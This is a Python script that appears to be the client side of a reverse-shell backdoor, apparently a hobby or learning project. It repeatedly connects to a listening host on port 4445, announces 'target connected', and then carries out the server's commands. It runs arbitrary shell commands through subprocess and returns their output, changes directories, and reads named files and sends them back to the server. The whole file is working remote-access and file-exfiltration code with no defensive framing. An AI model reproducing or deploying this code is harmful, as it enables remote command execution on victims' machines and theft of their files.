import socket
import subprocess 
import os
import time
 
host_ip = '127.0.0.1'
host_port = 4445

while True:
    
    sock = socket.socket()
    
    time.sleep(1.5) # wait for server to start listening again

    sock.connect((host_ip, host_port))

    print("hidden connection established")

    print("host: ", sock.getpeername()) # prints ip and port of host)

    print("this machine: ", sock.getsockname(), "\n") # prints client (this machine) ip and port (check ifconfig)

    # convert string to bytes as sendall takes bytes as parameter
    send_msg = bytes("target connected ;)", "utf-8")

    sock.sendall(send_msg) # sendall is better than send, as it will not return until all bytes are sent although it may take longer than send
    # sock.recv(4096) # default bufsize

    # while?

    while True:

        change = sock.recv(4096).decode("utf-8")

        if change == "0": # spaces in between commands

    # Run command
            msg = sock.recv(4096).decode("utf-8")   # send to other machine, check PIPE

            og_output = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE)
            output = og_output.stdout.read()

    # Return output
            print(output.decode("utf-8"))
            sock.sendall(output) # already in bytes format, no need to encrypt 
            print("command: " + msg)

        elif change == "1":

    # pwd
            sock.sendall(bytes(os.getcwd(), "utf-8"))

        elif change == "2":

    # Change dir
            change_dir = sock.recv(4096).decode("utf-8")
            os.chdir(change_dir)

    # Return cwd
            sock.sendall(bytes(os.getcwd(), "utf-8"))

        elif change == "3":
            file_name = sock.recv(4096).decode("utf-8")

            print("file: " + file_name)

    # insert try in case file name is non-existent

            file = open(file_name, "rb")
            file_content = file.read(4096)

            while (file_content):
                sock.send(file_content)
                file_content = file.read(4096) # read new bytes of file
                print("sending...")

            if (file_content == ""):
                print("nothing")
            else:
                print("file sent!")

            
            sock.shutdown(socket.SHUT_WR)
            sock.close()
            break

    #elif change == "3": ######## #####
    #sock.close()
    #print("close")
        else:
            print("error")



